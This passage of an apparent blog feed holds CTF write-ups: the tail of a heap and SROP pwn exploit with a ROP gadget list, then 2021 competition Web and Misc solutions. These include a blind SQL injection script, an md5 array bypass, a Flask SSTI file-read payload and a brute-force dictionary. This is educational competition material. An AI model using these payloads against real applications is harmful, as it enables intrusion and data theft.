class=\"line\">dele(<span class=\"number\">15</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x90</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x90</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x90</span>,<span class=\"string\">&#x27;\\0&#x27;</span>*<span class=\"number\">0x28</span>+p64(<span class=\"number\">0x91</span>)+p64(lock)+p64(<span class=\"number\">0</span>)) <span class=\"comment\"># _dl_fini+113</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,p64(libc.sym.gets)+p64(magic))</span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">16</span>)</span><br><span class=\"line\">dele(<span class=\"number\">17</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x90</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x90</span>,<span class=\"string\">&#x27;\\0&#x27;</span>*<span class=\"number\">8</span>+p64(<span class=\"number\">0x91</span>)+p64(main_arena_x96))</span><br><span class=\"line\"><span class=\"comment\"># add(0x90,&#x27;\\0&#x27;*0x28+p64(0x91)+p64(lock)+p64(0))</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;\\xa0&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># pause()</span></span><br><span class=\"line\">menu(<span class=\"number\">1</span>)</span><br><span class=\"line\">sla(<span class=\"string\">&#x27;Please input size: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x80</span>))</span><br><span class=\"line\"><span class=\"comment\"># show(21)</span></span><br><span class=\"line\"><span class=\"comment\"># dele(20)</span></span><br><span class=\"line\"><span class=\"comment\"># add(1)</span></span><br><span class=\"line\">addr = (libc.sym.__free_hook&gt;&gt;<span class=\"number\">12</span>)&lt;&lt;<span class=\"number\">12</span></span><br><span class=\"line\">fuck = SigreturnFrame()</span><br><span class=\"line\">fuck.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">fuck.rsi = addr</span><br><span class=\"line\">fuck.rdx = <span class=\"number\">0x300</span></span><br><span class=\"line\">fuck.rsp = addr + <span class=\"number\">8</span></span><br><span class=\"line\">fuck.rip = libc.sym.read</span><br><span class=\"line\">lock_rdi = <span class=\"number\">0x222968</span> + libc_base</span><br><span class=\"line\">sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x48</span>+p64(__printf_function_table+<span class=\"number\">8</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">mmp = flat([</span><br><span class=\"line\">    <span class=\"number\">0</span>,rdi,((addr)&gt;&gt;<span class=\"number\">12</span>)&lt;&lt;<span class=\"number\">12</span>,rsi,<span class=\"number\">0x2000</span>,rdx_r12,<span class=\"number\">7</span>,<span class=\"number\">0</span>,libc.sym.mprotect,rdi,<span class=\"number\">0</span>,rsi,addr+<span class=\"number\">0x400</span>,rdx_r12,<span class=\"number\">0x100</span>,<span class=\"number\">0</span>,libc.sym.read,libc_base + <span class=\"number\">0x000000000010d5dd</span></span><br><span class=\"line\">])</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">sl(mmp)</span><br><span class=\"line\"></span><br><span class=\"line\">sl(asm(shellcraft.cat(<span class=\"string\">&#x27;/flag&#x27;</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000248f1 : pop r15 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b69 : pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000005520f : pop rax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000226be : pop rax ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000015f8c5 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000036174 : pop rax ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b62 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000026019 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000ef193 : pop rbp ; pop r12 ; pop r13 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000025b9a : pop rbp ; pop r12 ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000008e22f : pop rbp ; pop r12 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002f708 : pop rbp ; pop r12 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000013641e : pop rbp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000248ee : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b66 : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002601d : pop rbp ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000ef197 : pop rbp ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000046077 : pop rbp ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000055bb8 : pop rbp ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000226c0 : pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000010feb0 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000046073 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000062569 : pop rbx ; pop r12 ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000005b937 : pop rbx ; pop r12 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000003040a : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000ef192 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000025b99 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000008e22e : pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002f830 : pop rbx ; pop rbp ; pop r12 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000013641d : pop rbx ; pop rbp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000196c62 : pop rbx ; pop rbp ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000226bf : pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002fdaf : pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000119150 : pop rcx ; pop rbp ; pop r12 ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000001587d3 : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000010257e : pop rcx ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000118d4f : pop rcx ; ret 0xf66</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000248f2 : pop rdi ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b6a : pop rdi ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000119211 : pop rdx ; pop r12 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000015f8c6 : pop rdx ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000010257d : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000142c92 : pop rdx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000dfc12 : pop rdx ; ret 0x10</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000248f0 : pop rsi ; pop r15 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b68 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002601f : pop rsi ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000248ec : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b64 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002601b : pop rsp ; pop r13 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000ef195 : pop rsp ; pop r13 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000046075 : pop rsp ; pop r13 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000025b9c : pop rsp ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000008e231 : pop rsp ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000012cf7e : pop rsp ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002f70a : pop rsp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000099020 : pop rsp ; ret 0xffff</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000022679 : ret</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "Crypto",
                "CTF",
                "Web",
                "Miec",
                "Re",
                "Pwn"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/2021%E4%B8%80%E5%B8%A6%E4%B8%80%E8%B7%AF%E6%9A%A8%E9%87%91%E7%A0%96%E5%A4%A7%E8%B5%9B%E4%B9%8B%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A1%B9%E5%86%B3%E8%B5%9BWriteUp/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/2021%E4%B8%80%E5%B8%A6%E4%B8%80%E8%B7%AF%E6%9A%A8%E9%87%91%E7%A0%96%E5%A4%A7%E8%B5%9B%E4%B9%8B%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A1%B9%E5%86%B3%E8%B5%9BWriteUp/",
            "title": "2021一带一路暨金砖大赛之企业信息系统安全赛项决赛WriteUp",
            "date_published": "2022-06-20T11:21:28.000Z",
            "content_html": "<p>本周三（2022/6/8）我们队伍（<strong>中国矿业大学 02 队</strong>）代表中国矿业大学参加了  <code>2021一带一路暨金砖大赛之企业信息系统安全赛项</code>  的决赛，也顺利地以 <strong>1700/2000</strong> 分拿到了 CTF 的第一名。<br />\n比赛中我们一同解出了 Crypto,Re,Pwn 方向的<strong>所有</strong>赛题，赛后认真对解题思路做了整理，对剩余未解出的少部分赛题也做了复现总结：</p>\n<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h2>\n<p>感觉题目都是常见的简单知识点，没什么太难的地方，唯一的难点就是有点谜语人，一堆登录框，没任何提示，就是要一顿乱莽</p>\n<h3 id=\"web1\"><a class=\"anchor\" href=\"#web1\">#</a> web1</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEwMS4xMzMuMTM0LjEyOjgwMDEv\">http://101.133.134.12:8001/</span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444670/Typera/2023/04/7cc93168358cebd281d36f75a99776e0.png\" alt=\"image-20220608125508509\" /></p>\n<p>一个界面就一直点气球，游戏结束也没见往外发包，就直接看 js 文件，找到存放 flag 的 php</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444663/Typera/2023/04/16f5828c9e0cfdae068d122fef90351c.png\" alt=\"image-20220608125456098\" /></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444663/Typera/2023/04/a428fdb8fa9752169a008288a92d1b8b.png\" alt=\"image-20220609223446550\" /></p>\n<p>访问 flag.php 会跳转到 404，F12 监控一下流量就行</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444664/Typera/2023/04/3ad71e6932bcc48f3adcdf7778e35ca0.png\" alt=\"image-20220609223614556\" /></p>\n<p>flag:88E3773E766EE1FFD98F3FEBE7D876DB</p>\n<h3 id=\"web2\"><a class=\"anchor\" href=\"#web2\">#</a> web2</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEwMS4xMzMuMTM0LjEyOjgwMDIv\">http://101.133.134.12:8002/</span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444665/Typera/2023/04/6188997a808503d88da1f67d3c493704.png\" alt=\"image-20220608090837625\" /></p>\n<p>SQL 注入，过滤空格和 for,union, <code>,</code> ,for, 空格，* 等关键字，最关键的是查表，information 没法用了，找个替代表即可</p>\n<p>最后构建出合适的 payload 语句进行时间盲注</p>\n<p><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"string\">&#x27;^(select(sleep(1))from(mysql.user)where((select(&#123;columns&#125;)from(&#123;table&#125;)where(&#123;limit&#125;))&lt;&#x27;</span>xxx<span class=\"string\">&#x27;))^&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<p>写个脚本获得密码</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getDatabase</span>(<span class=\"params\">flag=<span class=\"string\">&quot;&quot;</span></span>):  <span class=\"comment\"># 获取数据库名</span></span><br><span class=\"line\">    <span class=\"keyword\">global</span> baseurl,sql</span><br><span class=\"line\">    flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">1000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(mid,<span class=\"built_in\">chr</span>(mid))</span><br><span class=\"line\">            usesql=<span class=\"string\">&quot;1&#x27;^(select(sleep(1))from(mysql.user)where(%s))^&#x27;&quot;</span>%sql.\\</span><br><span class=\"line\">                    replace(<span class=\"string\">&quot;flag&quot;</span>,flag+<span class=\"built_in\">chr</span>(mid))</span><br><span class=\"line\">            <span class=\"comment\"># print(usesql)</span></span><br><span class=\"line\">            start_time=time.time()</span><br><span class=\"line\">            res = requests.post(</span><br><span class=\"line\">                baseurl +<span class=\"string\">&quot;login.php&quot;</span>,</span><br><span class=\"line\">                data=&#123;<span class=\"string\">&quot;uname&quot;</span>:usesql,</span><br><span class=\"line\">                  <span class=\"string\">&quot;passwd&quot;</span>:<span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            )</span><br><span class=\"line\">            use_time=time.time()-start_time</span><br><span class=\"line\">            <span class=\"comment\"># print(use_time)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> use_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid &lt;= <span class=\"number\">32</span> <span class=\"keyword\">or</span> mid &gt;= <span class=\"number\">127</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        flag += <span class=\"built_in\">chr</span>(mid - <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i,<span class=\"string\">&quot;flag is -&gt; &quot;</span> + flag)</span><br><span class=\"line\"></span><br><span class=\"line\">columns=<span class=\"string\">&quot;group_concat(passwd)&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 从sys.schema_index_statistics得到表名</span></span><br><span class=\"line\">table=<span class=\"string\">&quot;testx.admin&quot;</span></span><br><span class=\"line\">limit=<span class=\"string\">&quot;&#x27;U&#x27;&lt;&#x27;z&#x27;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">sql=<span class=\"string\">f&quot;(select(<span class=\"subst\">&#123;columns&#125;</span>)from(<span class=\"subst\">&#123;table&#125;</span>)where(<span class=\"subst\">&#123;limit&#125;</span>))&lt;&#x27;flag&#x27;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">baseurl=<span class=\"string\">&quot;http://101.133.134.12:8002/&quot;</span></span><br><span class=\"line\">getDatabase(<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#f9b46e5b6dc40d49fef9c5f287d177ad</span></span><br></pre></td></tr></table></figure></p>\n<p>获得密码的 md5 值，到<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc29tZDUuY29tLw==\"> md5 解密网站</span>可知时 5555666</p>\n<p>直接登录 admin:5555666</p>\n<p>获得 flag</p>\n<p AD7008D8BB2DFB6AD521F99A1FF08B54=\"\">flag</p>\n<h3 id=\"web3未解出\"><a class=\"anchor\" href=\"#web3未解出\">#</a> web3（未解出）</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEwMS4xMzMuMTM0LjEyOjgwMDMv\">http://101.133.134.12:8003/</span></p>\n<p>谜语了可以说是，弄了半天坐大牢不知道干什么，赛后看师傅们说还是 SQL，蚌埠住了，万万没想到会出两道 SQL</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444664/Typera/2023/04/39f4ca5dcdc6510260cb32462e4fc610.png\" alt=\"image-20220609221731113\" /></p>\n<h3 id=\"web4\"><a class=\"anchor\" href=\"#web4\">#</a> web4</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEwMS4xMzMuMTM0LjEyOjgwMDQv\">http://101.133.134.12:8004/</span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444663/Typera/2023/04/2cbdf0994890977a091df5ca11120743.png\" alt=\"image-20220609221821224\" /></p>\n<p>扫一下可以看到源码备份的 index.php.bak, 得到下面源码</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$key</span>=<span class=\"string\">&#x27;flag&#123;xxx&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;name&#x27;</span>]) <span class=\"keyword\">and</span> <span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pwd&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;name&#x27;</span>] == <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pwd&#x27;</span>])&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;p&gt;姓名与密码不能一致!&lt;/p&gt;&#x27;</span>;</span><br><span class=\"line\">       &#125;<span class=\"keyword\">elseif</span>(<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pwd&#x27;</span>]))&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">die</span>(<span class=\"string\">&#x27;密码不能是纯数字&#x27;</span>);</span><br><span class=\"line\">       &#125;<span class=\"keyword\">elseif</span> (<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;name&#x27;</span>]) == <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pwd&#x27;</span>]))&#123;</span><br><span class=\"line\">      <span class=\"keyword\">die</span>(<span class=\"variable\">$key</span>);&#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;p&gt;无效密码&lt;/p&gt;&#x27;</span>;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;p&gt;首次登陆!&lt;/p&gt;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>需要账号密码的值不能相等，也不能为纯数字，但是最后 md5 值相等</p>\n<p>经典的 md5 绕过问题，这个可以用 md5 强碰撞也可以用数组使得 md5 函数出错返回 False</p>\n<p>这里我选择直接用数组绕过使得 md5 函数出错返回 False 即可绕过获取 flag</p>\n<p>?name[]=1&amp;pwd[]=1</p>\n<p>得到 flag:</p>\n<p>FDA095FC516DA9AE2A15AB135BFF8C80</p>\n<h3 id=\"web5\"><a class=\"anchor\" href=\"#web5\">#</a> web5</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEwMS4xMzMuMTM0LjEyOjgwMDUv\">http://101.133.134.12:8005/</span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/45b7a99411b7284e79ecc93b545cba46.png\" alt=\"image-20220609221148060\" /></p>\n<p>控制面板显示是个 tabib 框架，但是上网找相关漏洞没有任何发现，网站的页面到处点也没发现可利用点，文件上传和新建数据什么的实际上不会发包执行，但是在日历版块有异常，访问会返回下面这句话但是</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444665/Typera/2023/04/dfcdddcfc40379b8f4ed863db11fc3bd.png\" alt=\"image-20220609211231533\" /></p>\n<p>猜测问题是出在这里，但是不知道漏洞点在哪里，最后开了个扫描发现一个 console 接口，进去发现是一个 Flask 后台，想到计算 Pin 码但是并不可行，最后发现在日历接口有 SSTI, 使用 SSTI 获取 /flag</p>\n<p>通过内置模块获取 open 函数打开 /flag 并通过 read 得到文件内容</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[64].__init__.__globals__.__builtins__.open(&#x27;/flag&#x27;,&#x27;r&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p>\n<p>变化一下就是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://101.133.134.12:8005/&#123;&#123;&#x27;&#x27;[request.values.c][request.values.m][-1][request.values.s]()[64][request.values.i][request.values.g][request.values.b][request.values.o](request.values.file,&#x27;r&#x27;)[request.values.r]() &#125;&#125;&amp;c=__class__&amp;m=__mro__&amp;s=__subclasses__&amp;i=__init__&amp;g=__globals__&amp;b=__builtins__&amp;o=open&amp;r=read&amp;file=/flag</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"web6\"><a class=\"anchor\" href=\"#web6\">#</a> web6</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEwMS4xMzMuMTM0LjEyOjgwMDYv\">http://101.133.134.12:8006/</span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444665/Typera/2023/04/86078170c086e4be0e3c19618dfdbd0f.png\" alt=\"image-20220609222553452\" /></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444666/Typera/2023/04/40d9dc8e7b8a4958999cf8472e8e3a44.png\" alt=\"image-20220609222805556\" /></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444666/Typera/2023/04/e667aae1d40eb237c602fe151a73a56c.png\" alt=\"image-20220609222758667\" /></p>\n<p>再次陷入谜语人状态，这个最后还是没出来，不过水群看到说是摁爆破 (原本想过爆破的，不过前两天刚把垃圾字典删了就没爆...)，最后 password 和 hash 为 admin@123 的对应值的时候就会得到存 flag 的文件 gettf1ag.php, 访问就有 flag</p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"misc1\"><a class=\"anchor\" href=\"#misc1\">#</a> misc1</h3>\n<p>给的文件后缀名是 .bat，010 打开发现，实际上应该是个 ppt（有很明显的 PowerPoint 字符），<br />\n更改后缀名为 ppt 之后，wps 打开，发现需要密码。<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444758/Typera/2023/04/8a2cd7f40020deec0fb07a490c84beb6.png\" alt=\"image-20230426014555010\" /></p>\n<p>在用 notepad 查看的时候，翻阅过程中突然看到提示：密码为 4 位纯数字</p>\n<p>使用脚本生成字典后直接爆破：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 字典生成</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> itertools <span class=\"keyword\">as</span> its</span><br><span class=\"line\">words = <span class=\"string\">&quot;1234568790&quot;</span></span><br><span class=\"line\">r =its.product(words,repeat=<span class=\"number\">4</span>)</span><br><span class=\"line\">dic = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;pass1.txt&quot;</span>,<span class=\"string\">&quot;a&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> r:</span><br><span class=\"line\">    dic.write(<span class=\"string\">&quot;&quot;</span>.join(i))</span><br><span class=\"line\">    dic.write(<span class=\"string\">&quot;&quot;</span>.join(<span class=\"string\">&quot;\\n&quot;</span>))</span><br><span class=\"line\">dic.close()</span><br></pre></td></tr></table></figure><br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 